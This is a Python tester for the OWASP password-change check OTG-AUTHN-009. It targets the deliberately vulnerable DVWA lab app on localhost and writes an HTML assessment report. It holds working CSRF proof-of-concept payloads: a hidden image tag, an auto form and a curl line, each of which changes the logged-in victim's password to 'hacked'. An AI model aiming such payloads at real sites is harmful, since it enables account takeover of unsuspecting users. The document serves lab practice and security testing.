# otg_authn_009_tester.py
# OTG-AUTHN-009: Testing for Weak Password Change or Reset Functionalities
# OSCP-Style Vulnerability Tester for DVWA (localhost XAMPP)
# CORRECTED VERSION - Proper CSRF Testing

import requests
import datetime
from bs4 import BeautifulSoup
import urllib3

# Disable SSL warnings for localhost
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === CONFIGURATION ===
BASE_URL = "http://localhost/dvwa"
LOGIN_URL = f"{BASE_URL}/login.php"
CSRF_URL = f"{BASE_URL}/vulnerabilities/csrf/"
USER_AGENT = "OTG-AUTHN-009 Tester v1.0"
USERNAME = "admin"
PASSWORD = "password"
NEW_TEMP_PASSWORD = "TempPass123!"

# Headers
headers = {
    'User-Agent': USER_AGENT,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.9',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'close'
}

def banner():
    print(r"""
    =====================================================
     OTG-AUTHN-009 - Weak Password Change/Reset Functions
             OSCP-Style Security Assessment
    =====================================================
    """)

def test_connection():
    try:
        resp = requests.get(LOGIN_URL, headers=headers, timeout=10, verify=False)
        if resp.status_code == 200:
            return True, resp
        else:
            return False, resp.status_code
    except requests.exceptions.RequestException as e:
        return False, str(e)

def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    token_elem = soup.find('input', {'name': 'user_token'})
    if token_elem:
        return token_elem['value']
    return None

def login(session):
    """Login to DVWA"""
    try:
        # Get login page
        resp = session.get(LOGIN_URL, headers=headers, verify=False, timeout=10)
        csrf_token = extract_csrf_token(resp)
        
        # Login
        data = {
            'username': USERNAME,
            'password': PASSWORD,
            'Login': 'Login'
        }
        if csrf_token:
            data['user_token'] = csrf_token
            
        login_resp = session.post(LOGIN_URL, data=data, headers=headers, verify=False)
        
        if "index.php" in login_resp.url:
            return True, login_resp
        else:
            return False, "Login failed"
    except Exception as e:
        return False, str(e)

def change_password_without_old_password(session, new_password):
    """Test password change without providing old password"""
    try:
        # Submit password change request using GET parameters (as shown in DVWA form)
        change_url = f"{CSRF_URL}?password_new={new_password}&password_conf={new_password}&Change=Change"
        change_resp = session.get(change_url, headers=headers, verify=False, timeout=10)
        
        # Check if password was changed successfully
        if "password changed" in change_resp.text.lower():
            return True, change_resp
        else:
            return False, change_resp
            
    except Exception as e:
        return False, str(e)

def test_csrf_vulnerability_proper():
    """Test CSRF vulnerability properly - demonstrate the attack scenario"""
    # The CSRF vulnerability in DVWA is that it accepts password changes
    # from ANY source when a user is logged in, without CSRF token validation
    
    # Create the CSRF attack URL
    csrf_attack_url = f"{CSRF_URL}?password_new=hacked&password_conf=hacked&Change=Change"
    
    # The PoC would be an HTML page that a victim would visit:
    csrf_poc = f'''<!-- CSRF Attack PoC -->
<img src="{csrf_attack_url}" width="1" height="1" alt="CSRF Attack">
    
Or as a form:
<form action="{csrf_attack_url}" method="GET">
    <input type="hidden" name="password_new" value="hacked">
    <input type="hidden" name="password_conf" value="hacked">
    <input type="hidden" name="Change" value="Change">
    <input type="submit" value="Click me!">
</form>'''
    
    return True, "DVWA is vulnerable to CSRF attacks", csrf_poc

def test_password_change_with_old_password():
    """Test if old password is required (DVWA doesn't require it)"""
    # DVWA's CSRF page doesn't require old password - this is the vulnerability
    return False, "DVWA does not require old password for password change"

def restore_password(session, original_password):
    """Restore original password"""
    try:
        change_url = f"{CSRF_URL}?password_new={original_password}&password_conf={original_password}&Change=Change"
        session.get(change_url, headers=headers, verify=False, timeout=10)
        return True
    except:
        return False

def analyze_session_behavior(session):
    """Analyze session behavior during password change"""
    try:
        # Get session ID before change
        original_session_id = session.cookies.get('PHPSESSID')
        
        # Change password
        change_url = f"{CSRF_URL}?password_new={NEW_TEMP_PASSWORD}&password_conf={NEW_TEMP_PASSWORD}&Change=Change"
        change_resp = session.get(change_url, headers=headers, verify=False, timeout=10)
        
        # Get session ID after change
        new_session_id = session.cookies.get('PHPSESSID')
        
        # Check if session ID changed
        session_regenerated = (original_session_id != new_session_id)
        
        # Restore password
        restore_password(session, PASSWORD)
        
        return session_regenerated, "Session analysis completed"
        
    except Exception as e:
        return False, f"Error analyzing session: {str(e)}"

def test_password_reset_functionality():
    """Test for password reset functionality (not present in DVWA)"""
    return "NOT IMPLEMENTED", "DVWA does not have password reset functionality"

def demonstrate_csrf_attack():
    """Demonstrate how CSRF attack works in real scenario"""
    print("[→] Demonstrating CSRF attack mechanism...")
    
    # The CSRF attack works like this:
    attack_explanation = """
CSRF Attack Mechanism in DVWA:

1. Victim logs into DVWA (http://localhost/dvwa)
2. Victim visits a malicious website while still logged in
3. The malicious website contains a hidden image or form that points to:
   http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
4. Victim's browser automatically sends the request WITH their DVWA session cookies
5. DVWA processes the request and changes the victim's password to "hacked"
6. The victim's account is now compromised

This works because:
- DVWA does not implement CSRF tokens
- The password change endpoint accepts requests from any source
- Browser automatically includes authentication cookies with cross-site requests
"""
    
    csrf_attack_url = f"{CSRF_URL}?password_new=hacked&password_conf=hacked&Change=Change"
    
    poc_html = f'''<!DOCTYPE html>
<html>
<head><title>CSRF Attack Demo</title></head>
<body>
    <h1>CSRF Attack Demo</h1>
    <p>When you visit this page while logged into DVWA, your password will be changed to "hacked"</p>
    <img src="{csrf_attack_url}" width="1" height="1" alt="CSRF Attack">
</body>
</html>'''
    
    return attack_explanation, poc_html

def generate_html_report(result, findings, poc, recommendations, csrf_explanation=""):
    report_name = "OTG-AUTHN-009_Report.html"
    date_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    status_color = "#cc0000" if "Failed" in result else "#008800"

    html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>OTG-AUTHN-009 Security Assessment Report</title>
    <style>
        body {{
            font-family: 'Courier New', monospace;
            background-color: #f4f4f4;
            color: #000;
            margin: 0;
            padding: 20px;
        }}
        .container {{
            max-width: 900px;
            margin: auto;
            background: white;
            padding: 20px;
            border: 1px solid #ccc;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }}
        header {{
            background-color: #003366;
            color: white;
            padding: 15px;
            text-align: center;
            font-size: 1.4em;
            margin: -20px -20px 20px -20px;
        }}
        h1, h2, h3 {{
            color: #003366;
            border-bottom: 1px solid #003366;
            padding-bottom: 5px;
        }}
        .field {{
            margin-bottom: 10px;
        }}
        .label {{
            font-weight: bold;
            display: inline-block;
            width: 250px;
        }}
        .value {{
            display: inline;
        }}
        .status {{
            color: {status_color};
            font-weight: bold;
        }}
        pre {{
            background: #f0f0f0;
            padding: 10px;
            border: 1px solid #ccc;
            overflow: auto;
            font-size: 0.9em;
        }}
        footer {{
            margin-top: 30px;
            text-align: center;
            font-size: 0.9em;
            color: #555;
            border-top: 1px solid #ccc;
            padding-top: 10px;
        }}
        .risk {{
            font-weight: bold;
            color: #cc0000;
        }}
        .success {{
            color: #008800;
            font-weight: bold;
        }}
        .failed {{
            color: #cc0000;
            font-weight: bold;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
        }}
        th, td {{
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }}
        th {{
            background-color: #f2f2f2;
        }}
        .vulnerable {{
            background-color: #ffe6e6;
        }}
        .secure {{
            background-color: #e6ffe6;
        }}
        .warning {{
            background-color: #fff3cd;
        }}
        .explanation {{
            background-color: #e3f2fd;
            padding: 15px;
            border-left: 4px solid #2196F3;
            margin: 15px 0;
        }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            OWASP Web Security Testing Guide - OTG-AUTHN-009
        </header>

        <h1>OTG-AUTHN-009: Testing for Weak Password Change or Reset Functionalities</h1>

        <div class="field"><span class="label">Test Date:</span> <span class="value">{date_str}</span></div>
        <div class="field"><span class="label">Target URL:</span> <span class="value">{BASE_URL}</span></div>
        <div class="field"><span class="label">Test Result:</span> <span class="value status">{result}</span></div>

        <h2>Vulnerability Description</h2>
        <p>
            Weak password change or reset functionalities can allow attackers to take over user accounts 
            without proper authentication. This includes vulnerabilities such as lack of old password 
            verification, CSRF protection failures, and insecure password reset mechanisms.
        </p>
        <p>
            This test evaluates DVWA's password change functionality in the CSRF vulnerability page, 
            which demonstrates insecure password change implementation without proper authentication 
            or CSRF protection.
        </p>

        <h2>Impact</h2>
        <p class="risk">High</p>
        <p>
            Vulnerable password change mechanisms can lead to full account takeover, unauthorized access 
            to sensitive data, and potential lateral movement within the application. Attackers can 
            permanently lock out legitimate users and gain persistent access to compromised accounts.
        </p>

        <h2>CSRF Attack Explanation</h2>
        <div class="explanation">
            <pre>{csrf_explanation}</pre>
        </div>

        <h2>Test Findings</h2>
        <pre>{findings}</pre>

        <h2>Proof of Concept (PoC)</h2>
        <p>The following examples demonstrate the vulnerabilities found:</p>
        <pre><code>{poc}</code></pre>

        <h2>Remediation / Recommendations</h2>
        <p>{recommendations}</p>

        <h2>References</h2>
        <ul>
            <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities" target="_blank">
                OWASP WSTG - OTG-AUTHN-009</a></li>
            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">
                OWASP CSRF Prevention Cheat Sheet</a></li>
            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#password-change" target="_blank">
                OWASP Authentication Cheat Sheet - Password Change</a></li>
            <li><a href="https://owasp.org/www-project-top-ten/2017/A02_2017-Broken_Authentication" target="_blank">
                OWASP Top 10 - A02:2017 Broken Authentication</a></li>
            <li>Always require the old password for changes</li>
            <li>Implement CSRF tokens and validate them server-side</li>
            <li>Regenerate session IDs after password change</li>
            <li>Do not expose password change functionality without authentication</li>
            <li>Implement rate limiting on password change attempts</li>
        </ul>

        <footer>
            OSCP-Style Security Assessment Report | Generated by OTG-AUTHN-009 Tester
        </footer>
    </div>
</body>
</html>
    """

    with open(report_name, 'w', encoding='utf-8') as f:
        f.write(html_content)

    print(f"[+] Report generated: {report_name}")

def main():
    banner()

    print("[+] Starting OTG-AUTHN-009 test...")
    
    # Test connectivity
    print("[✓] Testing connectivity to target...")
    connected, resp_or_err = test_connection()
    if not connected:
        print(f"[-] Failed to connect to {LOGIN_URL}")
        print(f"Error: {resp_or_err}")
        return

    print(f"[✓] Connected to {LOGIN_URL}")

    # Initialize session and login
    session = requests.Session()
    print("[✓] Logging in...")
    success, result = login(session)
    if not success:
        print(f"[-] Login failed: {result}")
        return

    print("[✓] Logged in successfully")

    # Test findings
    findings = []
    vulnerabilities = []
    poc_examples = []

    # Test 1: Password change without old password
    print("[→] Testing password change without old password...")
    success, response = change_password_without_old_password(session, NEW_TEMP_PASSWORD)
    if success:
        findings.append("✓ PASSWORD CHANGE WITHOUT OLD PASSWORD: VULNERABLE")
        vulnerabilities.append("Password change does not require old password")
        poc_examples.append(f"curl \"{CSRF_URL}?password_new=hacked&password_conf=hacked&Change=Change\"")
        print("    [!] VULNERABLE - Password changed without old password")
    else:
        findings.append("✓ PASSWORD CHANGE WITHOUT OLD PASSWORD: SECURE")
        print("    [✓] Secure - Old password required (or not applicable)")

    # Restore original password after test 1
    restore_password(session, PASSWORD)

    # Test 2: CSRF vulnerability (proper explanation)
    print("[→] Testing CSRF vulnerability...")
    is_vulnerable, message, csrf_poc = test_csrf_vulnerability_proper()
    findings.append(f"✓ CSRF PROTECTION: {message}")
    vulnerabilities.append("CSRF protection missing or ineffective")
    poc_examples.append(csrf_poc)
    print("    [!] VULNERABLE - CSRF protection missing")
    
    # Get CSRF attack explanation
    csrf_explanation, csrf_html_poc = demonstrate_csrf_attack()

    # Test 3: Session regeneration
    print("[→] Testing session behavior during password change...")
    session_regenerated, message = analyze_session_behavior(session)
    findings.append(f"✓ SESSION REGENERATION: {'YES' if session_regenerated else 'NO'}")
    if not session_regenerated:
        vulnerabilities.append("Session not regenerated after password change")
        print("    [!] WARNING - Session not regenerated")
    else:
        print("    [✓] Good - Session regenerated")

    # Test 4: Password reset functionality (not in DVWA)
    print("[→] Checking for password reset functionality...")
    reset_status, reset_message = test_password_reset_functionality()
    findings.append(f"✓ PASSWORD RESET FUNCTIONALITY: {reset_message}")
    print("    [!] NOT IMPLEMENTED - DVWA does not have password reset")

    # Compile findings text
    findings_text = "Password Change/Reset Functionality Test Results:\n"
    findings_text += "=" * 60 + "\n"
    for finding in findings:
        findings_text += finding + "\n"
    findings_text += "\n"

    # Generate report
    if vulnerabilities:
        result_status = "Failed"
        
        poc = "\n\n".join(poc_examples) if poc_examples else "No PoC examples generated"
        
        recommendations = """
The application contains critical vulnerabilities in password change functionality that must be addressed immediately:

1. Always require the old password for password changes:
   - Implement old password verification before allowing changes
   - This prevents unauthorized changes even with session hijacking

2. Implement strong CSRF protection:
   - Use unpredictable, unique CSRF tokens for each session
   - Validate tokens server-side on all state-changing operations
   - Set tokens to expire after reasonable time periods
   - Include tokens in all forms and AJAX requests

3. Regenerate session IDs after password changes:
   - Prevent session fixation attacks
   - Invalidate old sessions to prevent session replay

4. Implement proper access controls:
   - Ensure password change functionality requires authentication
   - Verify user identity before allowing changes

5. Add rate limiting:
   - Prevent brute-force attacks on password change endpoints
   - Implement account lockout after multiple failed attempts

6. Secure password change form implementation:
   - Use POST instead of GET for password changes
   - Validate all input server-side
   - Implement proper error handling without information leakage

7. Logging and monitoring:
   - Log all password change attempts
   - Alert on suspicious password change patterns
   - Maintain audit trails for compliance

8. Multi-factor authentication:
   - Require additional verification for sensitive operations
   - Implement step-up authentication for password changes
"""
    else:
        result_status = "Passed"
        findings_text += "No critical vulnerabilities found in password change functionality.\n"
        poc = "No vulnerabilities found to demonstrate."
        csrf_explanation = "No CSRF vulnerabilities detected."
        
        recommendations = """
The password change functionality appears to be secure. However, continue to:

1. Regularly audit authentication mechanisms for security issues.
2. Implement comprehensive logging and monitoring of password changes.
3. Conduct periodic penetration testing of authentication flows.
4. Stay updated with OWASP and NIST authentication guidelines.
5. Consider implementing multi-factor authentication for additional security.
6. Review password policies and enforcement mechanisms.
7. Train developers on secure authentication implementation practices.
8. Implement proper session management and timeout policies.
"""

    generate_html_report(result_status, findings_text, poc, recommendations, csrf_explanation)
    print("[+] Test completed.")

if __name__ == "__main__":
    main()